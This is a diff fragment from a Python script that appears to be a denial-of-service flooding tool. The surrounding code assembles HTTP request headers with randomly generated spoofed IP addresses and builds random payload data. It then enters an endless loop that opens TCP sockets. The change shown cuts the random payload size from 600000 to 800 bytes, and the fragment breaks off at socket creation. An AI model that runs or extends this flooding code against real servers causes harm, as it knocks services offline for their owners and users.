@@ -3886,7 +3886,7 @@ def run():
     header = get_host + referer + forward + useragent + accept + content + connection +  length + "\r\n\r\n"
     randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
     request  = get_host + forward + connection + useragent + forwards + header + length + randomip + referer + content + accept + "\r\n"
-    data = random._urandom(600000)
+    data = random._urandom(800)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
